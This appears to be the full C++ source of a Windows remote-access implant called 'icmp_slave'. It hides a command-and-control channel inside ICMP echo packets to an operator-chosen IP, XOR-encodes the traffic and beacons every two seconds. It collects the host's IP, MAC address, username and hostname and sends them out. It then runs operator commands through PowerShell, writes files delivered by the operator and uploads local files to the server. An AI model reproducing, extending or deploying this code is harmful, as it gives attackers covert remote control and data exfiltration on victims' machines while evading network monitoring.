#include <cstdint>
#include <cstdio>
#include <cstring>
#include <iostream>
#include <fstream>
#include <vector>
#include <thread>
#include <mutex>

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <iphlpapi.h>
#include <IcmpAPI.h>

#define DATA_SIZE 64
#define HEADER_SIZE 6
#define BUF_SIZE (DATA_SIZE + HEADER_SIZE)
#define BEACON_TIME 2000

struct buffer
{
    size_t pos{ 0 };
    bool ready{ false };
    std::vector<uint8_t> data;
};

static buffer out_buf;
static buffer in_buf;
static std::mutex buffer_mutex;

static uint32_t id;

std::vector<std::string> split_input(const std::string &input, const std::string &delimiter) {
    size_t pos_start = 0, pos_end, delim_len = delimiter.length();
    std::string token;
    std::vector<std::string> res;

    while ((pos_end = input.find(delimiter, pos_start)) != std::string::npos) {
        token = input.substr(pos_start, pos_end - pos_start);
        pos_start = pos_end + delim_len;
        res.push_back(token);
    }

    res.push_back(input.substr(pos_start));
    return res;
}

bool create_process(const char *cmd, HANDLE *out_read, HANDLE *in_write) {
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sattr;
    STARTUPINFOA si;
    HANDLE in_read, out_write;

    memset(&pi, 0x00, sizeof(PROCESS_INFORMATION));

    memset(&sattr, 0x00, sizeof(SECURITY_ATTRIBUTES));
    sattr.nLength = sizeof(SECURITY_ATTRIBUTES);
    sattr.bInheritHandle = TRUE;
    sattr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(out_read, &out_write, &sattr, 0)) {
        return false;
    }
    if (!SetHandleInformation(*out_read, HANDLE_FLAG_INHERIT, 0)) {
        return false;
    }

    if (!CreatePipe(&in_read, in_write, &sattr, 0)) {
        return false;
    }
    if (!SetHandleInformation(*in_write, HANDLE_FLAG_INHERIT, 0)) {
        return false;
    }

    memset(&si, 0x00, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.hStdError = out_write;
    si.hStdOutput = out_write;
    si.hStdInput = in_read;
    si.dwFlags |= STARTF_USESTDHANDLES;

    std::string command_line = "powershell ";
    command_line += cmd;

    if (!CreateProcessA(NULL, (char *)command_line.c_str(), NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFOA)&si, &pi)) {
        return false;
    }

    CloseHandle(out_write);
    CloseHandle(in_read);

    return true;
}

void handle_data() {
    std::lock_guard<std::mutex> guard(buffer_mutex);
    std::string data{ (char *)in_buf.data.data(), in_buf.data.size() };

    auto res = split_input(data, " ");

    auto &cmd = res.at(0);

    if (cmd == "run") {
        std::string cmd_str;
        for (size_t i = 1; i < res.size(); i++) {
            cmd_str.append(res.at(i));
            if (i != res.size() - 1) {
                cmd_str.append(" ");
            }
        }

        std::cout << "Running command: " << cmd_str << "\n";
        HANDLE pipe_read, pipe_write;
        if (create_process(cmd_str.c_str(), &pipe_read, &pipe_write)) {
            uint8_t buf[512];
            DWORD nbytes;
            while (1) {
                if (!ReadFile(pipe_read, buf, 512, &nbytes, NULL)) {
                    if (GetLastError() == ERROR_BROKEN_PIPE) {
                        break;
                    }
                }
                out_buf.data.insert(out_buf.data.end(), &buf[0], &buf[nbytes]);
            }
        }

        std::cout << "Finished exectuting\n";
        out_buf.ready = true;
    } else if (cmd == "download") {
        auto &out_file = res.at(1);
        std::cout << "Downloading to: " << out_file << "\n";
        std::string file_data;
        for (size_t i = 2; i < res.size(); i++) {
            file_data.append(res.at(i));
        }
        std::cout << "File Data: " << file_data << "\n";
        std::ofstream file(out_file);
        if (file.is_open()) {
            file << file_data;
        } else {
            std::cerr << "Could not open file!\n";
        }
    } else if (cmd == "upload") {
        auto &in_file = res.at(1);
        std::cout << "Uploading file: " << in_file << "\n";

        std::ifstream file(in_file, std::ios::binary);
        if (file.is_open()) {
            out_buf.data.insert(out_buf.data.end(),
                std::istream_iterator<uint8_t>(file),
                std::istream_iterator<uint8_t>());
        } else {
            std::cerr << "Could not open file!\n";
        }

        out_buf.ready = true;
    }
    in_buf.data.clear();
}

void encode_data(uint32_t key, uint8_t *data, uint32_t size) {
    int index = 3;
    for (uint32_t i = 0; i < size; i++) {
        if (index < 0) index = 3;
        uint8_t val = data[i];
        uint8_t e = (key >> (8 * index)) & 0xFF;
        data[i] = val ^ e;
        index--;
    }
}

uint32_t icmp_send_recv(HANDLE icmp_chan, uint32_t dest_ip, uint8_t *out, uint32_t out_size, uint8_t *in, uint32_t in_size, uint32_t timeout) {
    uint8_t *tmp_buf = new uint8_t[sizeof(ICMP_ECHO_REPLY) + out_size];

    uint32_t ret = IcmpSendEcho(icmp_chan, dest_ip, out, out_size, nullptr, tmp_buf, sizeof(ICMP_ECHO_REPLY) + out_size, timeout);

    if (ret == 0) {
        delete[] tmp_buf;
        return 0;
    }

    PICMP_ECHO_REPLY reply = (PICMP_ECHO_REPLY)tmp_buf;
    if (reply->DataSize <= in_size) {
        memcpy(in, reply->Data, reply->DataSize);
    }

    ret = reply->DataSize;

    delete[] tmp_buf;
    return ret;
}

void get_host_info(uint32_t dest_ip) {
    DWORD dwBestIfIndex;
    GetBestInterface((IPAddr)dest_ip, &dwBestIfIndex);

    std::cout << "Best index: " << dwBestIfIndex << "\n";

    ULONG size = 0;
    PIP_ADAPTER_ADDRESSES pAddresses = nullptr;
    PIP_ADAPTER_ADDRESSES pCurrAddresses = nullptr;

    GetAdaptersAddresses(AF_INET, 0, nullptr, nullptr, &size);
    pAddresses = (IP_ADAPTER_ADDRESSES *)malloc(size);

    std::string ip_address;
    std::string phys_address;
    std::string username;
    std::string hostname;
    std::string os = "Windows";

    if (GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_GATEWAYS, nullptr, pAddresses, &size) == NO_ERROR) {
        pCurrAddresses = pAddresses;
        while (pCurrAddresses) {
            if (pCurrAddresses->IfIndex == dwBestIfIndex) {
                struct sockaddr_in *ipaddr = (sockaddr_in *)pCurrAddresses->FirstUnicastAddress->Address.lpSockaddr;
                ip_address = inet_ntoa(ipaddr->sin_addr);

                char tmp[18];
                snprintf(tmp,
                    18,
                    "%02x:%02x:%02x:%02x:%02x:%02x",
                    pCurrAddresses->PhysicalAddress[0],
                    pCurrAddresses->PhysicalAddress[1],
                    pCurrAddresses->PhysicalAddress[2],
                    pCurrAddresses->PhysicalAddress[3],
                    pCurrAddresses->PhysicalAddress[4],
                    pCurrAddresses->PhysicalAddress[5]);

                phys_address = std::string{ tmp, 18 };
                break;
            }
            pCurrAddresses = pCurrAddresses->Next;
        }
    }

    if (pAddresses) {
        free(pAddresses);
    }

    char buf[256];
    DWORD buf_size = sizeof(buf);
    GetUserName(buf, &buf_size);
    username = std::string{ buf, buf_size - 1 };

    buf_size = sizeof(buf);
    GetComputerName(buf, &buf_size);
    hostname = std::string{ buf, buf_size };

    std::string host_info;
    host_info += ip_address;
    host_info += "/";
    host_info += phys_address;
    host_info += "/";
    host_info += username;
    host_info += "@";
    host_info += hostname;
    host_info += "/";
    host_info += os;

    std::cout << host_info << "\n";

    out_buf.data.insert(out_buf.data.end(), host_info.data(), host_info.data() + host_info.size());
    out_buf.ready = true;
}

void usage(int exit_code) {
    puts("usage: icmp_slave [-h] dst_ip\n");
    exit(exit_code);
}

int main(int argc, char **argv) {
    // Check args
    if (argc < 2) {
        usage(-1);
    }

    if (strcmp(argv[1], "-h") == 0) {
        usage(0);
    }

    uint32_t dest_ip = inet_addr(argv[1]);
    get_host_info(dest_ip);

    HANDLE icmp_chan = IcmpCreateFile();

    uint8_t out[BUF_SIZE];
    uint8_t in[BUF_SIZE];
    uint8_t flush = 0x00;
    uint8_t out_size = 0;

    while (1) {
        Sleep(BEACON_TIME);

        std::memset(out, 0, BUF_SIZE);
        std::memset(in, 0, BUF_SIZE);

        if (id) {
            std::memcpy(&out[0], &id, sizeof(id));

            if (flush == 0x01) {
                flush = 0x00;
            }

            if (out_buf.ready && out_buf.pos < out_buf.data.size()) {
                std::lock_guard<std::mutex> guard(buffer_mutex);
                out_size = (out_buf.data.size() - out_buf.pos) > DATA_SIZE ? DATA_SIZE : (out_buf.data.size() - out_buf.pos);
                std::memcpy(&out[HEADER_SIZE], out_buf.data.data() + out_buf.pos, out_size);
                encode_data(id, &out[HEADER_SIZE], out_size);
                out_buf.pos += out_size;
                flush = 0x00;
                if (out_buf.pos >= out_buf.data.size()) {
                    std::puts("Flushing data to server!");
                    out_buf.data.clear();
                    out_buf.pos = 0;
                    out_buf.ready = false;
                    flush = 0x01;
                }
            } else {
                flush = 0x02;
                out_size = 0;
            }
            std::memcpy(&out[4], &flush, sizeof(flush));
            std::memcpy(&out[5], &out_size, sizeof(out_size));
        }

        uint32_t nbytes = icmp_send_recv(icmp_chan, dest_ip, out, BUF_SIZE, in, BUF_SIZE, 3);

        if (nbytes < BUF_SIZE) continue;

        if (!id) {
            std::memcpy(&id, &in[0], sizeof(id));
            std::cout << "Established connection with id=" << id << "\n";
            continue;
        }

        if (in[4] == 0x00) {
            std::lock_guard<std::mutex> guard(buffer_mutex);
            uint8_t in_size = in[5];
            if (in_size > 0) {
                encode_data(id, &in[HEADER_SIZE], in_size);
                in_buf.data.insert(in_buf.data.end(), &in[HEADER_SIZE], &in[HEADER_SIZE + in_size]);
            }
        } else if (in[4] == 0x01) {
            std::thread handle_data_thread(handle_data);
            handle_data_thread.detach();
        }
    }

    return 0;
}
